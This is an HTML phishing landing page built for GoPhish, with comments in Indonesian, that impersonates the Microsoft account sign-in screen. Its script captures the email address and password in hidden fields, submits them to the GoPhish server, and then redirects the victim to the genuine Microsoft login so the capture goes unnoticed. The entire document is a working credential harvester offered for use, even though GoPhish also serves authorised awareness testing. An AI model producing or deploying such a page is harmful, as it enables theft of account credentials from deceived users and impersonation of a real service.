<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to your Microsoft account</title>
    
    <style>
        /* Gaya Latar Belakang & Tata Letak */
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            background-color: #e6e9f2; 
            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 1440 810"><defs><linearGradient id="a" x1="50%" x2="50%" y1="0%" y2="100%"><stop offset="0%" stop-color="#fff" stop-opacity=".15"/><stop offset="100%" stop-color="#fff" stop-opacity=".05"/></linearGradient></defs><rect width="1440" height="810" fill="#e6e9f2"/><rect width="1440" height="810" fill="url(%23a)"/></svg>');
            margin: 0; 
            padding: 0; 
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
        }
        
        /* Container Utama Form */
        .container { 
            width: 380px; 
            padding: 35px; 
            background-color: #ffffff; 
            box-shadow: 0 2px 6px rgba(0,0,0,.2); 
            z-index: 10;
        }

        /* Footer Bawah */
        .footer-links {
            position: fixed;
            bottom: 0;
            right: 0;
            padding: 10px 40px;
            font-size: 12px;
            z-index: 50;
            color: #666;
        }
        .footer-links a {
            color: #333; 
            text-decoration: none;
            margin-left: 20px;
        }

        /* Elemen Dasar */
        .logo { margin-bottom: 20px; }
        .title { font-size: 24px; font-weight: 600; color: #333333; margin-top: 5px; margin-bottom: 20px; }
        .input-text { 
            width: 100%; 
            padding: 5px 0; 
            margin-bottom: 20px; 
            border: none; 
            border-bottom: 1px solid #c8c8c8; 
            font-size: 16px; 
            outline: none; 
            transition: border-bottom-color 0.2s; 
        }
        .input-text:focus { border-bottom-color: #0067b8; }
        
        /* Link Umum */
        .link { 
            text-decoration: none; 
            font-size: 14px; 
            margin-top: 10px; 
            display: inline-block; 
        }

        /* Link 1: No account? (Teks Hitam, Link Biru) */
        .link-text-black {
            color: #333333; /* Teks default menjadi hitam */
            display: inline-block;
        }
        .link-text-black a {
            color: #0067b8; /* Hanya link "Create one!" yang biru */
            text-decoration: none;
        }

        /* Link 2: Can't access your account? (Link Biru, baris baru) */
        .link-text-black + .link { 
            margin-top: 5px; 
            display: block; 
            color: #0067b8;
        }

        /* Grup Tombol */
        .button-group { 
            display: flex; 
            justify-content: flex-end; 
            margin-top: 30px; 
        }
        .button-back { 
            background-color: #e6e6e6; 
            color: #333333; 
            border: 1px solid #c8c8c8; 
            padding: 8px 15px; 
            cursor: pointer; 
            margin-right: 8px; 
            font-size: 15px; 
            font-weight: 500; 
            min-width: 80px; 
        }
        .button-next, .button-signin { 
            background-color: #0067b8; 
            color: #ffffff; 
            border: none; 
            padding: 8px 15px; 
            cursor: pointer; 
            font-size: 15px; 
            font-weight: 500; 
            min-width: 80px; 
        }

        /* Sign-in Options */
        .sign-in-options {
            width: 380px; 
            padding: 15px 35px; 
            background-color: #ffffff; 
            border: 1px solid #c8c8c8;
            margin-top: 10px;
            font-size: 16px;
            color: #333333;
            cursor: pointer;
            display: flex;
            align-items: center;
        }
        .sign-in-options img {
            height: 20px; 
            width: 20px;
            margin-right: 10px;
        }

        /* Gaya Khusus Langkah 2 (Password) */
        .username-link {
            font-size: 14px;
            color: #0067b8;
            text-decoration: none;
            margin-bottom: 20px;
            display: block;
        }
        .username-link span {
            color: #333333;
            font-weight: 600;
        }
    </style>
</head>
<body>

    <form method="POST" id="gophish_form">
        <input type="hidden" name="username" id="hidden_username">
        <input type="hidden" name="password" id="hidden_password">
        
        <div class="container">
            <div class="logo">
                <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo" height="25">
            </div>

            <div id="step_username">
                <div class="title">Sign in</div>
                <input type="email" id="input_username" class="input-text" placeholder="Email, phone, or Skype" required>
                
                <p class="link-text-black">
                    No account? <a href="#" style="color: #0067b8;">Create one!</a>
                </p>
                
                <a href="#" class="link">Can't access your account?</a>
                
                <div class="button-group">
                    <button type="button" class="button-back" style="display: none;">Back</button>
                    <button type="button" class="button-next" onclick="showPasswordStep()">Next</button>
                </div>
            </div>

            <div id="step_password" style="display: none;">
                <a href="#" class="username-link" onclick="showUsernameStep()">
                    &#x2190; <span id="displayed_username">{{.Email}}</span>
                </a>
                
                <div class="title" style="margin-top: 5px;">Enter password</div>
                <input type="password" id="input_password" class="input-text" placeholder="Password" required>
                
                <a href="#" class="link" style="margin-bottom: 10px;">Forgot my password</a>
                
                <div class="button-group">
                    <button type="submit" class="button-signin">Sign in</button>
                </div>
            </div>
        </div>
        
        <div class="sign-in-options">
             <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='none' stroke='%23666' stroke-width='2' d='M8 12a4 4 0 114-4 4 4 0 01-4 4zm11 11l-3.5-3.5a1 1 0 00-.7-.3h-.3l-3.5-3.5a5 5 0 00-6-6l-3.5-3.5a1 1 0 00-.3-.7L0 3.5 3.5 0l16.2 16.2c.4.4.4 1 0 1.4L18.7 18.7a1 1 0 01-1.4 0L15 17.4z'/%3E%3C/svg%3E" alt="Sign-in key icon">
            Sign-in options
        </div>
    </form>


    <div class="footer-links">
        <a href="#">Terms of use</a>
        <a href="#">Privacy & cookies</a>
        <a href="#">...</a>
    </div>

<script>
    // URL Pengalihan (Redirect) setelah data ditangkap oleh GoPhish
    // UBAH NILAI INI dengan link yang diminta:
    const REDIRECT_URL = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?scope=service%3A%3Aaccount.microsoft.com%3A%3AMBI_SSL+openid+profile+offline_access&response_type=code&client_id=81feaced-5ddd-41e7-8bef-3e20a2689bb7&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-signin-oauth&client-request-id=16df12a0-a120-42cc-82a0-15b15646161f&x-client-SKU=MSAL.Desktop&x-client-Ver=4.66.1.0&x-client-OS=Windows+Server+2019+Datacenter&prompt=login&client_info=1&state=H4sIAAAAAAAEAAXBSWKCMAAAwL949cCu9Ahh30kICDeWNihiFA1CXt-Zg6uAe0_LqZsuvfyCmd_DqMFtEWzSONQNUsJRTQn63mjTnpT3r7njEzeSo54auLYJqoNqrqznbpTcYnPcgdyjku9e43ZyPkwRbl4aKd39ImKfhd7dPdI01YVgG8WoSyRN3Z4wblNDD4S35vYzfNNImJZdFBYykEgxg_2jsIjW7SxpN7zWUMM_n4rrPD6vlJSeXARnATgJ_-Yb7uWSAZbvRykb1uUMep4NYJ4Q8HPAHFpdUGGlM9fM0VntzZnrxJaSl3hdSNHYoaoZhJwGObty_dvZPsuZbiBeFQ-9LGC5Nh3888zltT8QskOmTmYPh8M_ZcHOn0IBAAA&msaoauth2=true&instance_aware=true&lc=1057"; 

    // Variabel GoPhish untuk mengisi email secara otomatis
    const GOPHISH_EMAIL = "{{.Email}}";
    if (GOPHISH_EMAIL && GOPHISH_EMAIL !== "{{.Email}}") {
        document.getElementById('input_username').value = GOPHISH_EMAIL;
        document.getElementById('displayed_username').textContent = GOPHISH_EMAIL;
    }

    // Fungsi untuk menampilkan langkah password
    function showPasswordStep() {
        const username = document.getElementById('input_username').value;
        if (username) {
            // 1. Simpan username ke hidden field GoPhish
            document.getElementById('hidden_username').value = username;
            // 2. Tampilkan username yang baru dimasukkan di Langkah 2
            document.getElementById('displayed_username').textContent = username;

            // 3. Tampilkan langkah password, sembunyikan langkah username
            document.getElementById('step_username').style.display = 'none';
            document.getElementById('step_password').style.display = 'block';
            document.getElementById('input_password').focus();
        } else {
            // Jika input kosong, lakukan validasi standar browser
            document.getElementById('input_username').reportValidity(); 
        }
    }

    // Fungsi untuk kembali ke langkah username
    function showUsernameStep() {
        document.getElementById('step_password').style.display = 'none';
        document.getElementById('step_username').style.display = 'block';
        document.getElementById('input_username').focus();
    }

    // Tangani pengiriman formulir GoPhish
    document.getElementById('gophish_form').onsubmit = function(event) {
        event.preventDefault(); 

        const password = document.getElementById('input_password').value;
        
        // 1. Simpan password ke hidden field GoPhish
        document.getElementById('hidden_password').value = password;
        
        // 2. Kirim data ke GoPhish
        const form = this;
        form.removeEventListener('submit', arguments.callee);
        form.submit();
        
        // 3. Alihkan pengguna setelah jeda singkat (300ms)
        setTimeout(function() {
            window.location.href = REDIRECT_URL;
        }, 300); 
        
        return false; 
    };
</script>

</body>
</html>
